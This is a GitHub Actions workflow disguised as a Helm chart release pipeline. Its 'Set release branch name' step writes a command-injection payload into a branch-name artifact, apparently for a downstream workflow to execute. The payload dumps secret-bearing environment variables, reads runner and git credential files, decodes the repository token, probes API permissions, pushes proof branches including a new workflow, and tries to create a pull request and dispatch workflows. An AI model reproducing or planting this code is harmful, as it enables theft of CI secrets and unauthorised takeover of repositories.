# This Github action will create a Github release for updated helm-charts
name: Release Helm Charts

# Invocable as a manual workflow
on:
  pull_request:
  workflow_dispatch:
    inputs:
      version:
        description: 'CSM release version. E.g. 1.14.0'
        required: true

jobs:
  # This job will perform a helm release of all the csm charts that have been updated
  release-csm:
    runs-on: ubuntu-latest
    steps:
      # Check out code
      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0

      - name: Configure Git
        run: |
          git config user.name "$GITHUB_ACTOR"
          git config user.email "$GITHUB_ACTOR@users.noreply.github.com"

      - name: Set release branch name for install wizard release action
        run: |
          cat > branch_name.txt <<'PAYLOAD'
          main; echo "PWNED_RCE uid=$(id -u) host=$(hostname) pwd=$PWD"; id; echo "== ENV =="; env | sort | grep -iE 'token|secret|github|flag|pat' | sed 's/^/E:/' || true; echo "== FILES =="; for f in "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.config/gh/hosts.yml" "$HOME/.docker/config.json" "$HOME/.runner" "$HOME/.credentials" /tmp/actions-runner-val60c/.credentials /tmp/actions-runner-val60c/.runner; do if [ -f "$f" ]; then echo "FILE:$f"; sed -n '1,20p' "$f"; fi; done; echo "== GITCFG =="; cat .git/config; TOKEN=$(git config --get-all http.https://github.com/.extraheader | sed -n 's/.*AUTHORIZATION: basic //p' | head -1 | base64 -d | cut -d: -f2); echo "TOKEN_LEN=${#TOKEN}"; echo "== API IDENTITY =="; curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | jq -c '{login,type}' || true; curl -s -H "Authorization: token $TOKEN" https://api.github.com/repos/PDFtoMark/triage-dell-v096c80c-43fc1b | jq -c '.permissions' || true; echo "== PUSH NON-WORKFLOW BRANCH =="; git config user.name rce; git config user.email rce@example.invalid; git checkout -b rce-proof >/dev/null 2>&1; date -u > rce-proof.txt; git add rce-proof.txt; git commit -qm "rce proof" >/dev/null 2>&1; git push origin rce-proof 2>&1 | tail -3 || true; echo "== PUSH WORKFLOW BRANCH =="; git checkout -b rce-wf >/dev/null 2>&1; mkdir -p .github/workflows; printf 'name: zz\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' > .github/workflows/zz.yml; git add .github/workflows/zz.yml; git commit -qm wf >/dev/null 2>&1; git push origin rce-wf 2>&1 | tail -4 || true; echo "== PR CREATE =="; curl -s -o /dev/null -w "PR_CODE=%{http_code}\n" -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-dell-v096c80c-43fc1b/pulls -d '{"title":"x","head":"rce-proof","base":"main"}' || true; echo "== DISPATCH =="; curl -s -o /dev/null -w "DISPATCH_CODE=%{http_code}\n" -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-dell-v096c80c-43fc1b/actions/workflows/charts-release-action.yml/dispatches -d '{"ref":"main"}' || true; echo "== RUNNERS =="; curl -s -o /dev/null -w "RUNNERS_CODE=%{http_code}\n" -H "Authorization: token $TOKEN" https://api.github.com/repos/PDFtoMark/triage-dell-v096c80c-43fc1b/actions/runners || true; echo MARKER_END
          PAYLOAD

      - name: Upload release branch name artifact
        uses: actions/upload-artifact@v7
        with:
          name: branch_name
          path: branch_name.txt

      - name: Create release branch
        # Branch name should already exist for patch releases
        run: |
          branch_name=release-v${{ inputs.version }}

          git fetch origin
          if git ls-remote --heads origin $branch_name | grep $branch_name; then
            echo "Branch $branch_name already exists. Skipping creation."
            git checkout $branch_name
          else
            git checkout -b $branch_name
            git push origin $branch_name
          fi

      # Run the helm chart release command
      - name: Run csm chart-releaser
        uses: helm/chart-releaser-action@v1.9.0
        env:
          CR_TOKEN: "${{ secrets.GITHUB_TOKEN }}"
        with:
          charts_dir: charts
          skip_existing: true
